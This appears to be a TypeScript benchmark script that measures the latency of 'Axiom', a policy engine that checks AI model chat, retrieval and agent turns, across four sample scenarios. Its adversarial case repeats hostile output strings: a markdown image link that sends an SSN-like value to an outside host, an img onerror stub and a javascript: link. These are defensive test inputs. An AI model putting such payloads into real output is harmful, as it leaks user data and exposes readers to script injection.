/**
 * Latency benchmark for the deterministic engine (no audit sink, no detectors).
 *   npm run bench
 */
import { Axiom, type EvaluateRequest } from '../src/index.js';

const axiom = new Axiom({
  policy: {
    sinks: { http: { allow: [{ host: 'hooks.acme.com' }] }, tools: { allow: ['search'] } },
    rendering: { linkAllowHosts: ['acme.com'] },
    commitments: { packs: ['finance'] },
    canaries: ['AXIOM-CANARY-0123456789'],
  },
});

const para =
  'Applicants must provide two recent pay stubs and a government-issued ID. Self-employed applicants may submit tax returns instead. ';
const principal = { roles: ['support'], clearance: 'internal' as const };

const cases: Array<[string, EvaluateRequest]> = [
  ['Chat turn (input + 300 B output)', { tenantId: 't', principal, input: 'What documents do I need?', output: para.repeat(2) }],
  [
    'RAG turn (10 chunks x 1 KB, 1 KB output)',
    {
      tenantId: 't',
      principal,
      input: 'Summarize the requirements',
      context: Array.from({ length: 10 }, (_, i) => ({
        id: `c${i}`,
        tenantId: 't',
        trust: i % 3 ? ('internal' as const) : ('untrusted' as const),
        sensitivity: 'internal' as const,
        content: para.repeat(8),
      })),
      output: para.repeat(8),
    },
  ],
  [
    'Agent turn (5 chunks, 3 actions)',
    {
      tenantId: 't',
      principal,
      context: Array.from({ length: 5 }, (_, i) => ({
        id: `c${i}`,
        tenantId: 't',
        trust: 'internal' as const,
        sensitivity: 'internal' as const,
        content: para.repeat(4),
      })),
      output: 'Done.',
      actions: [
        { kind: 'http', target: 'https://hooks.acme.com/v1/e', method: 'POST', payload: { a: 1, b: para } },
        { kind: 'tool', target: 'search', payload: { q: 'pay stubs' } },
        { kind: 'email', target: 'ops@acme.com' },
      ],
    },
  ],
  [
    'Adversarial 10 KB output',
    {
      tenantId: 't',
      principal,
      output: `![x](https://e.io/?d=123-45-6789) <img src=x onerror=1> [a](javascript:x) ${para}`.repeat(40).slice(0, 10_000),
    },
  ],
];

function bench(req: EvaluateRequest): { p50: number; p99: number; mean: number } {
  for (let i = 0; i < 300; i++) axiom.evaluate(req);
  const samples: number[] = [];
  const deadline = performance.now() + 1500;
  while (performance.now() < deadline) {
    const t0 = performance.now();
    axiom.evaluate(req);
    samples.push(performance.now() - t0);
  }
  samples.sort((a, b) => a - b);
  const q = (p: number) => samples[Math.min(samples.length - 1, Math.floor(p * samples.length))]!;
  return { p50: q(0.5), p99: q(0.99), mean: samples.reduce((a, b) => a + b, 0) / samples.length };
}

const fmt = (ms: number) => (ms < 1 ? `${(ms * 1000).toFixed(0)} µs` : `${ms.toFixed(2)} ms`);
console.log(`Node ${process.version}, ${process.platform}/${process.arch}\n`);
console.log('| Scenario | p50 | p99 | Throughput (1 core) |');
console.log('|---|---|---|---|');
for (const [name, req] of cases) {
  const r = bench(req);
  console.log(`| ${name} | ${fmt(r.p50)} | ${fmt(r.p99)} | ${Math.round(1000 / r.mean).toLocaleString('en-US')} req/s |`);
}
